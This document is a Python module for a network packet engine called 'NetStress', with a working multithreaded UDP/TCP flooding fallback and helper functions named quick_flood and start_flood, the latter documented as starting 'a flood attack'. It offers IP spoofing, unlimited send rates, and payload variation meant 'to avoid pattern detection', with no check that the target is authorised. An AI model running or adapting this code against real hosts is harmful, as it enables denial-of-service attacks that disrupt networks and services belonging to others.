"""
NetStress Native Engine Integration
Provides Python interface to the Rust/C high-performance engine

This module implements the "Sandwich" architecture:
- Python (this file): Configuration, control, reporting
- Rust (netstress_engine): Packet generation, threading, memory safety
- C (driver_shim): DPDK, AF_XDP, io_uring, raw sockets

NO SIMULATIONS - All operations are real network operations.
"""

import os
import sys
import time
import logging
import platform
import asyncio
from contextlib import nullcontext
from dataclasses import dataclass, field
from typing import Dict, Any, Optional, List
from enum import Enum

logger = logging.getLogger(__name__)

# Try to import the native Rust engine
NATIVE_ENGINE_AVAILABLE = False
_native_module = None

try:
    import netstress_engine
    _native_module = netstress_engine
    NATIVE_ENGINE_AVAILABLE = True
    logger.info("Native Rust engine loaded successfully")
except ImportError as e:
    logger.warning(f"Native engine not available: {e}")
    logger.info("Using pure Python fallback (lower performance)")


class BackendType(Enum):
    """Available backend types in priority order"""
    AUTO = "auto"
    NATIVE = "native"  # Alias for auto with native preference
    DPDK = "dpdk"
    AF_XDP = "af_xdp"
    IO_URING = "io_uring"
    SENDMMSG = "sendmmsg"
    RAW_SOCKET = "raw_socket"
    PYTHON = "python"  # Pure Python fallback


class Protocol(Enum):
    """Supported network protocols"""
    UDP = "udp"
    TCP = "tcp"
    ICMP = "icmp"
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    
    def __eq__(self, other):
        if isinstance(other, str):
            return self.value == other.lower()
        return super().__eq__(other)
    
    def __hash__(self):
        return hash(self.value)


@dataclass
class EngineConfig:
    """Configuration for the native engine"""
    target: str
    port: int
    protocol: Protocol = Protocol.UDP
    threads: int = 4  # Default to 4 threads
    packet_size: int = 1472  # MTU-optimized
    rate_limit: Optional[int] = None  # None = unlimited
    backend: BackendType = BackendType.AUTO
    duration: int = 60
    spoof_ips: bool = False
    burst_size: int = 32
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'target': self.target,
            'port': self.port,
            'protocol': self.protocol.value,
            'threads': self.threads if self.threads > 0 else os.cpu_count() or 4,
            'packet_size': self.packet_size,
            'rate_limit': self.rate_limit,
            'backend': self.backend.value,
            'duration': self.duration,
            'spoof_ips': self.spoof_ips,
            'burst_size': self.burst_size,
        }


@dataclass
class EngineStats:
    """Statistics from the engine"""
    packets_sent: int = 0
    bytes_sent: int = 0
    errors: int = 0
    duration: float = 0.0
    pps: float = 0.0  # Packets per second
    bps: float = 0.0  # Bytes per second
    gbps: float = 0.0  # Gigabits per second
    backend: str = "unknown"
    is_native: bool = False
    bytes_per_second: float = 0.0  # Alias for bps
    
    def __post_init__(self):
        # Sync bytes_per_second with bps
        if self.bytes_per_second > 0 and self.bps == 0:
            self.bps = self.bytes_per_second
        elif self.bps > 0 and self.bytes_per_second == 0:
            self.bytes_per_second = self.bps
        # Calculate gbps if not set
        if self.gbps == 0 and self.bps > 0:
            self.gbps = self.bps * 8 / 1_000_000_000
    
    @property
    def duration_secs(self) -> float:
        """Alias for duration"""
        return self.duration
    
    @property
    def mbps(self) -> float:
        """Get megabits per second"""
        return self.bps * 8 / 1_000_000
    
    @property
    def success_rate(self) -> float:
        """Get success rate as percentage"""
        if self.packets_sent == 0:
            return 0.0
        total = self.packets_sent + self.errors
        return (self.packets_sent / total) * 100.0
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'EngineStats':
        bps = data.get('bytes_per_second', data.get('bps', 0.0))
        return cls(
            packets_sent=data.get('packets_sent', 0),
            bytes_sent=data.get('bytes_sent', 0),
            errors=data.get('errors', 0),
            duration=data.get('duration_secs', data.get('duration', 0.0)),
            pps=data.get('packets_per_second', data.get('pps', 0.0)),
            bps=bps,
            bytes_per_second=bps,
            gbps=bps * 8 / 1_000_000_000 if bps > 0 else 0.0,
            backend=data.get('backend', 'unknown'),
            is_native=data.get('is_native', False),
        )


@dataclass
class SystemCapabilities:
    """System capabilities for backend selection"""
    platform: str = ""
    arch: str = ""
    cpu_count: int = 1
    has_dpdk: bool = False
    has_af_xdp: bool = False
    has_io_uring: bool = False
    has_sendmmsg: bool = False
    has_raw_socket: bool = True
    kernel_version: tuple = (0, 0)
    is_root: bool = False
    native_available: bool = False
    # Windows-specific capabilities
    has_iocp: bool = False  # I/O Completion Ports
    has_registered_io: bool = False  # Registered I/O (RIO)
    # macOS-specific capabilities
    has_kqueue: bool = False
    
    def __contains__(self, key: str) -> bool:
        """Support 'in' operator for dict-like access"""
        # Map common key names to attributes
        key_map = {
            'dpdk': 'has_dpdk',
            'af_xdp': 'has_af_xdp',
            'io_uring': 'has_io_uring',
            'sendmmsg': 'has_sendmmsg',
            'raw_socket': 'has_raw_socket',
            'iocp': 'has_iocp',
            'registered_io': 'has_registered_io',
            'kqueue': 'has_kqueue',
        }
        attr = key_map.get(key, key)
        return hasattr(self, attr)
    
    def __getitem__(self, key: str) -> Any:
        """Support dict-like access"""
        key_map = {
            'dpdk': 'has_dpdk',
            'af_xdp': 'has_af_xdp',
            'io_uring': 'has_io_uring',
            'sendmmsg': 'has_sendmmsg',
            'raw_socket': 'has_raw_socket',
            'iocp': 'has_iocp',
            'registered_io': 'has_registered_io',
            'kqueue': 'has_kqueue',
        }
        attr = key_map.get(key, key)
        return getattr(self, attr)
    
    def get(self, key: str, default: Any = None) -> Any:
        """Dict-like get method"""
        key_map = {
            'dpdk': 'has_dpdk',
            'af_xdp': 'has_af_xdp',
            'io_uring': 'has_io_uring',
            'sendmmsg': 'has_sendmmsg',
            'raw_socket': 'has_raw_socket',
            'iocp': 'has_iocp',
            'registered_io': 'has_registered_io',
            'kqueue': 'has_kqueue',
        }
        attr = key_map.get(key, key)
        return getattr(self, attr, default)
    
    @classmethod
    def detect(cls) -> 'SystemCapabilities':
        """Detect system capabilities"""
        caps = cls()
        caps.platform = platform.system()
        caps.arch = platform.machine()
        caps.cpu_count = os.cpu_count() or 1
        caps.native_available = NATIVE_ENGINE_AVAILABLE
        
        # Check root/admin
        try:
            caps.is_root = os.geteuid() == 0
        except AttributeError:
            # Windows
            import ctypes
            caps.is_root = ctypes.windll.shell32.IsUserAnAdmin() != 0
        
        # Linux-specific capabilities
        if caps.platform == "Linux":
            caps.has_raw_socket = True
            caps.has_sendmmsg = True  # Available since Linux 3.0
            
            # Check kernel version
            try:
                release = platform.release()
                parts = release.split('.')
                if len(parts) >= 2:
                    caps.kernel_version = (int(parts[0]), int(parts[1].split('-')[0]))
            except (ValueError, IndexError):
                pass
            
            # io_uring requires Linux 5.1+
            if caps.kernel_version >= (5, 1):
                caps.has_io_uring = True
            
            # AF_XDP requires Linux 4.18+
            if caps.kernel_version >= (4, 18):
                caps.has_af_xdp = True
        
        # Windows-specific capabilities
        elif caps.platform == "Windows":
            caps.has_raw_socket = True
            caps.has_iocp = True  # IOCP available on all modern Windows
            # Check for Registered I/O (Windows 8+/Server 2012+)
            try:
                import sys
                # Windows 8 is version 6.2
                win_ver = sys.getwindowsversion()
                if win_ver.major > 6 or (win_ver.major == 6 and win_ver.minor >= 2):
                    caps.has_registered_io = True
            except Exception:
                caps.has_registered_io = False
        
        # macOS-specific capabilities
        elif caps.platform == "Darwin":
            caps.has_raw_socket = True
            caps.has_kqueue = True  # kqueue available on all macOS versions
        
        # Get native capabilities if available
        if NATIVE_ENGINE_AVAILABLE:
            try:
                native_caps = _native_module.get_capabilities()
                caps.has_dpdk = native_caps.get('dpdk', False)
                caps.has_af_xdp = native_caps.get('af_xdp', caps.has_af_xdp)
            except Exception as e:
                logger.warning(f"Failed to get native capabilities: {e}")
        
        return caps


class UltimateEngine:
    """
    High-performance packet engine with automatic backend selection.
    
    This is the main interface for the Power Trio architecture.
    It automatically uses the native Rust engine when available,
    falling back to pure Python when necessary.
    
    Usage:
        config = EngineConfig(target="192.168.1.1", port=80)
        engine = UltimateEngine(config)
        
        engine.start()
        time.sleep(10)
        stats = engine.stop()
        print(f"Sent {stats.packets_sent} packets at {stats.pps} PPS")
    
    Or with context manager:
        with UltimateEngine(config) as engine:
            time.sleep(10)
            print(engine.get_stats())
    """
    
    def __init__(self, config: EngineConfig):
        self.config = config
        self._native_engine = None
        self._python_engine = None
        self._is_native = False
        self._running = False
        self._start_time = None
        self._capabilities = SystemCapabilities.detect()
        self._engine_id = f"{config.target}:{config.port}_{int(time.time())}"
        self._stats_bridge_registered = False
        
        # Check if native is required but not available
        if config.backend == BackendType.NATIVE and not NATIVE_ENGINE_AVAILABLE:
            raise RuntimeError(
                "Native backend requested but not available. "
                "Build the Rust engine with: cd native/rust_engine && maturin develop --release"
            )
        
        # Try to create native engine
        if NATIVE_ENGINE_AVAILABLE and config.backend not in (BackendType.PYTHON,):
            try:
                self._native_engine = _native_module.PacketEngine(
                    config.target,
                    config.port,
                    config.threads if config.threads > 0 else os.cpu_count() or 4,
                    config.packet_size
                )
                self._is_native = True
                logger.info(f"Using native Rust engine for {config.target}:{config.port}")
            except Exception as e:
                logger.warning(f"Failed to create native engine: {e}")
                self._is_native = False
        
        # Fall back to Python if native not available
        if not self._is_native:
            if config.backend == BackendType.NATIVE:
                raise RuntimeError("Native backend initialization failed")
            logger.info("Using pure Python engine (lower performance)")
            self._python_engine = PythonFallbackEngine(config)
    
    def start(self) -> None:
        """Start packet generation"""
        if self._running:
            raise RuntimeError("Engine already running")
        
        self._start_time = time.monotonic()
        self._running = True
        
        # Register with stats bridge (works for both native and Python engines)
        if not self._stats_bridge_registered:
            try:
                from .analytics import register_native_engine
                register_native_engine(self._engine_id, self)
                self._stats_bridge_registered = True
                logger.debug(f"Registered engine {self._engine_id} with stats bridge (native={self._is_native})")
            except ImportError:
                logger.warning("Analytics module not available, stats bridge disabled")
            except Exception as e:
                logger.warning(f"Failed to register with stats bridge: {e}")
        
        if self._is_native:
            self._native_engine.start()
        else:
            self._python_engine.start()
        
        logger.info(f"Engine started (native={self._is_native})")
    
    def stop(self) -> EngineStats:
        """Stop packet generation and return final stats"""
        if not self._running:
            raise RuntimeError("Engine not running")
        
        self._running = False
        
        # Unregister from stats bridge
        if self._stats_bridge_registered:
            try:
                from .analytics import unregister_native_engine
                unregister_native_engine(self._engine_id)
                self._stats_bridge_registered = False
                logger.debug(f"Unregistered engine {self._engine_id} from stats bridge")
            except Exception as e:
                logger.warning(f"Failed to unregister from stats bridge: {e}")
        
        if self._is_native:
            self._native_engine.stop()
            stats_dict = self._native_engine.get_stats()
        else:
            self._python_engine.stop()
            stats_dict = self._python_engine.get_stats()
        
        stats_dict['is_native'] = self._is_native
        stats_dict['backend'] = 'rust' if self._is_native else 'python'
        
        logger.info(f"Engine stopped after {stats_dict.get('duration_secs', 0):.2f}s")
        return EngineStats.from_dict(stats_dict)
    
    def get_stats(self) -> EngineStats:
        """Get current statistics"""
        if self._is_native:
            stats_dict = self._native_engine.get_stats()
        else:
            stats_dict = self._python_engine.get_stats()
        
        stats_dict['is_native'] = self._is_native
        stats_dict['backend'] = 'rust' if self._is_native else 'python'
        return EngineStats.from_dict(stats_dict)
    
    def is_running(self) -> bool:
        """Check if engine is running"""
        if self._is_native:
            return self._native_engine.is_running()
        return self._running
    
    def set_rate(self, pps: int) -> None:
        """Set target rate (packets per second)"""
        if self._is_native:
            self._native_engine.set_rate(pps)
        else:
            self._python_engine.set_rate(pps)
    
    @property
    def capabilities(self) -> SystemCapabilities:
        """Get system capabilities"""
        return self._capabilities
    
    @property
    def backend_name(self) -> str:
        """Get the name of the active backend"""
        if self._is_native:
            return "rust_native"
        return "python"
    
    def __enter__(self):
        self.start()
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        if self._running:
            self.stop()
        return False
    
    def __repr__(self):
        return f"UltimateEngine(target={self.config.target}, native={self._is_native})"



class PythonFallbackEngine:
    """
    Pure Python fallback engine when native Rust engine is not available.
    
    This provides basic functionality but with significantly lower performance
    compared to the native engine. Expected performance: 50K-200K PPS.
    
    Optimizations:
    - Connected UDP sockets (avoids per-packet address lookup)
    - Multiple sockets per thread (reduces lock contention)
    - Batch statistics updates (reduces atomic operations)
    - Pre-generated payloads (avoids allocation in hot path)
    - Adaptive rate limiting
    
    NO SIMULATIONS - This actually sends real packets.
    """
    
    def __init__(self, config: EngineConfig):
        self.config = config
        self._running = False
        self._threads = []
        self._stats_lock = None
        self._stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'errors': 0,
            'start_time': None,
        }
        self._rate_limit = config.rate_limit
        self._socket = None
    
    def start(self) -> None:
        """Start packet generation using Python sockets"""
        import socket
        import threading
        
        self._running = True
        self._stats_lock = threading.Lock()
        self._stats['start_time'] = time.monotonic()
        self._stats['packets_sent'] = 0
        self._stats['bytes_sent'] = 0
        self._stats['errors'] = 0
        
        # Resolve target
        try:
            target_ip = socket.gethostbyname(self.config.target)
        except socket.gaierror as e:
            raise RuntimeError(f"Failed to resolve target: {e}")
        
        # Create worker threads
        num_threads = self.config.threads if self.config.threads > 0 else os.cpu_count() or 4
        
        for i in range(num_threads):
            t = threading.Thread(
                target=self._worker_optimized,
                args=(target_ip, self.config.port, i),
                daemon=True
            )
            self._threads.append(t)
            t.start()
    
    def _worker_optimized(self, target_ip: str, port: int, thread_id: int) -> None:
        """Optimized worker thread with batching and multiple sockets"""
        import socket
        
        # Create multiple sockets for parallel sending
        SOCKETS_PER_THREAD = 4
        sockets = []
        
        for _ in range(SOCKETS_PER_THREAD):
            if self.config.protocol == Protocol.UDP:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                try:
                    # Optimize socket
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16 * 1024 * 1024)
                    # Connect UDP socket for faster sending
                    sock.connect((target_ip, port))
                    sock.setblocking(False)
                    sockets.append(sock)
                except Exception:
                    sock.close()
            else:
                # TCP handled differently
                sockets.append(None)
        
        if not sockets or (self.config.protocol == Protocol.UDP and not any(sockets)):
            return
        
        # Pre-generate multiple payload variants
        PAYLOAD_COUNT = 8
        payloads = []
        for i in range(PAYLOAD_COUNT):
            p = bytearray(self.config.packet_size)
            # Vary first bytes to avoid pattern detection
            p[0] = (thread_id + i) & 0xFF
            if self.config.packet_size > 1:
                p[1] = (i * 17) & 0xFF
            payloads.append(bytes(p))
        
        # Local stats for batching
        local_packets = 0
        local_bytes = 0
        local_errors = 0
        FLUSH_INTERVAL = 1000
        
        # Rate limiting
        rate_per_thread = self._rate_limit // max(1, len(self._threads)) if self._rate_limit and self._rate_limit > 0 else 0
        last_check = time.monotonic()
        packets_this_second = 0
        
        # Batch settings
        INNER_BATCH = 100
        socket_idx = 0
        payload_idx = 0
        
        while self._running:
            # Rate limiting with adaptive sleep
            if rate_per_thread > 0:
                now = time.monotonic()
                elapsed = now - last_check
                if elapsed >= 1.0:
                    last_check = now
                    packets_this_second = 0
                elif packets_this_second >= rate_per_thread:
                    # Adaptive sleep
                    overage = packets_this_second - rate_per_thread
                    sleep_time = max(0.00001, min(0.001, overage / rate_per_thread * 0.01))
                    time.sleep(sleep_time)
                    continue
            
            # Inner batch loop for maximum throughput
            if self.config.protocol == Protocol.UDP:
                sock = sockets[socket_idx]
                if sock:
                    payload = payloads[payload_idx]
                    
                    for _ in range(INNER_BATCH):
                        try:
                            sent = sock.send(payload)
                            if sent > 0:
                                local_packets += 1
                                local_bytes += sent
                                packets_this_second += 1
                        except BlockingIOError:
                            pass
                        except Exception:
                            local_errors += 1
                    
                    socket_idx = (socket_idx + 1) % len(sockets)
                    payload_idx = (payload_idx + 1) % PAYLOAD_COUNT
            else:
                # TCP/HTTP handling
                self._tcp_send(target_ip, port, payloads[payload_idx])
                local_packets += 1
                local_bytes += len(payloads[payload_idx])
                payload_idx = (payload_idx + 1) % PAYLOAD_COUNT
            
            # Batch update global stats
            if local_packets >= FLUSH_INTERVAL:
                with self._stats_lock:
                    self._stats['packets_sent'] += local_packets
                    self._stats['bytes_sent'] += local_bytes
                    self._stats['errors'] += local_errors
                local_packets = 0
                local_bytes = 0
                local_errors = 0
        
        # Final flush
        if local_packets > 0:
            with self._stats_lock:
                self._stats['packets_sent'] += local_packets
                self._stats['bytes_sent'] += local_bytes
                self._stats['errors'] += local_errors
        
        # Cleanup
        for sock in sockets:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
    
    def _tcp_send(self, target_ip: str, port: int, payload: bytes) -> bool:
        """Send TCP packet with connection reuse attempt"""
        import socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.connect((target_ip, port))
            sock.send(payload)
            sock.close()
            return True
        except Exception:
            return False
    
    def stop(self) -> None:
        """Stop packet generation"""
        self._running = False
        
        # Wait for threads to finish
        for t in self._threads:
            t.join(timeout=1.0)
        
        self._threads.clear()
    
    def get_stats(self) -> Dict[str, Any]:
        """Get current statistics"""
        duration = 0.0
        if self._stats['start_time']:
            duration = time.monotonic() - self._stats['start_time']
        
        with self._stats_lock if self._stats_lock else nullcontext():
            packets = self._stats['packets_sent']
            bytes_sent = self._stats['bytes_sent']
            errors = self._stats['errors']
        
        return {
            'packets_sent': packets,
            'bytes_sent': bytes_sent,
            'errors': errors,
            'duration_secs': duration,
            'packets_per_second': packets / max(0.001, duration),
            'bytes_per_second': bytes_sent / max(0.001, duration),
        }
    
    def set_rate(self, pps: int) -> None:
        """Set target rate"""
        self._rate_limit = pps


def get_capabilities() -> SystemCapabilities:
    """Get system capabilities for backend selection"""
    return SystemCapabilities.detect()


def create_engine(
    target: str,
    port: int,
    protocol: str = "udp",
    threads: int = 0,
    packet_size: int = 1472,
    rate_limit: int = 0,
    duration: int = 60,
) -> UltimateEngine:
    """
    Factory function to create an engine with the best available backend.
    
    Args:
        target: Target IP or hostname
        port: Target port
        protocol: Protocol (udp, tcp, http, icmp)
        threads: Number of worker threads (0 = auto)
        packet_size: Packet payload size
        rate_limit: Max packets per second (0 = unlimited)
        duration: Test duration in seconds
    
    Returns:
        UltimateEngine instance
    """
    config = EngineConfig(
        target=target,
        port=port,
        protocol=Protocol(protocol.lower()),
        threads=threads,
        packet_size=packet_size,
        rate_limit=rate_limit,
        duration=duration,
    )
    return UltimateEngine(config)


def quick_flood(
    target: str,
    port: int,
    duration: int = 10,
    protocol: str = "udp",
    rate_limit: int = 0,
) -> EngineStats:
    """
    Quick flood function for simple use cases.
    
    Args:
        target: Target IP or hostname
        port: Target port
        duration: Duration in seconds
        protocol: Protocol to use
        rate_limit: Max PPS (0 = unlimited)
    
    Returns:
        Final statistics
    """
    engine = create_engine(
        target=target,
        port=port,
        protocol=protocol,
        rate_limit=rate_limit,
        duration=duration,
    )
    
    engine.start()
    time.sleep(duration)
    return engine.stop()


# Aliases for backward compatibility
NativePacketEngine = UltimateEngine
EngineBackend = BackendType


def is_native_available() -> bool:
    """Check if native Rust engine is available"""
    return NATIVE_ENGINE_AVAILABLE


def start_flood(
    target: str,
    port: int,
    duration: int = 60,
    rate: int = 100000,
    threads: int = 4,
    packet_size: int = 1472,
    protocol: str = "udp",
) -> Dict[str, Any]:
    """
    Start a flood attack and return statistics.
    
    This is a convenience function that wraps the native engine.
    """
    if NATIVE_ENGINE_AVAILABLE:
        try:
            return _native_module.start_flood(
                target, port, duration, rate, threads, packet_size, protocol
            )
        except Exception as e:
            logger.warning(f"Native flood failed: {e}, using Python fallback")
    
    # Python fallback
    stats = quick_flood(target, port, duration, protocol, rate)
    return {
        'packets_sent': stats.packets_sent,
        'bytes_sent': stats.bytes_sent,
        'average_pps': stats.pps,
        'average_bps': stats.bps,
        'errors': stats.errors,
        'duration_secs': stats.duration,
    }


def build_packet(
    src_ip: str,
    dst_ip: str,
    src_port: int,
    dst_port: int,
    protocol: str = "udp",
    payload: Optional[bytes] = None,
) -> bytes:
    """
    Build a custom packet.
    
    Returns raw packet bytes.
    """
    if NATIVE_ENGINE_AVAILABLE:
        try:
            return bytes(_native_module.build_packet(
                src_ip, dst_ip, src_port, dst_port, protocol, payload
            ))
        except Exception as e:
            logger.warning(f"Native build_packet failed: {e}")
    
    # Python fallback - basic UDP packet
    import struct
    
    # Simple UDP packet (no IP header - kernel adds it)
    if payload is None:
        payload = os.urandom(64)
    
    udp_header = struct.pack('!HHHH',
        src_port,  # Source port
        dst_port,  # Destination port
        8 + len(payload),  # Length
        0,  # Checksum (0 = let kernel calculate)
    )
    
    return udp_header + payload


# Export public API
__all__ = [
    # New API
    'UltimateEngine',
    'EngineConfig',
    'EngineStats',
    'SystemCapabilities',
    'BackendType',
    'Protocol',
    'get_capabilities',
    'create_engine',
    'quick_flood',
    'NATIVE_ENGINE_AVAILABLE',
    # Backward compatibility
    'NativePacketEngine',
    'EngineBackend',
    'is_native_available',
    'start_flood',
    'build_packet',
]
